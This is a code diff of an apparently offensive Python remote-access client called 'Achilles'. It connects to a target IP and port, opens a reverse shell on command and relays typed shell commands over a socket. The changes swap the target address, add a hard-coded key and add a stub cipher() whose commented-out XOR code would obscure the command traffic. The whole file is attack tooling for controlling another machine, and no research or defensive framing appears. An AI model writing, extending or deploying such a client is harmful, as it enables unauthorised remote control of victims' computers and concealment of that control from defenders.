@@ -4,9 +4,10 @@ from time import sleep
 ATTACKER_IP = "0.0.0.0"
 ATTACKER_PORT = 22
 
-TARGET_IP = "192.168.68.106"
+TARGET_IP = "10.0.0.14"
 TARGET_PORT = 8989
 
+KEY=b"Op3r4t1on_4ch1ll3s"
 
 def connection():
     # | 1. dst addr | 2. skt | 3. connect | 4. sendall
@@ -64,14 +65,18 @@ def mainMenu(skt):
         command = input("Enter your command: ")
 
         if command == "rs":
-            skt.sendall(command.encode("utf-8"))
+            enc_cmd=cipher(command.encode("utf-8"))
+            skt.sendall(enc_cmd)
+
             response = skt.recv(1024).decode("utf-8")
             print(f" > {response}")
             reverseShell(skt)
             print("[*] Back to menu")
 
         elif command == "exit":
-            skt.sendall(command.encode("utf-8"))
+            enc_cmd = cipher(command.encode("utf-8"))
+            skt.sendall(enc_cmd)
+
             skt.close()
             exit(0)
         else:
@@ -87,7 +92,8 @@ def reverseShell(skt):
     skt.settimeout(None)
     while True:
         command = input("")
-        skt.sendall((command + "\n").encode("utf-8"))
+        enc_cmd = (command + "\n").encode("utf-8")
+        skt.sendall(enc_cmd)
         sleep(1)
         print("\033[2K", end='\r')
         while True:
@@ -106,7 +112,17 @@ def reverseShell(skt):
             break
     skt.settimeout(None)
 
-
+def cipher(message):
+    return message
+# def cipher(message):
+#     key = KEY
+#     key_len = len(key)
+#
+#     # for i in range(key_len):
+#     #     message[i] = message[i]^key[i%key_len]
+#     #
+#     # return message
+#     return bytes([message[i] ^ key[i % key_len] for i in range(len(message))])
 
 def main():
     print("Welcome Achilles!\n [1] Normal connection\n [2] Reverse connection")
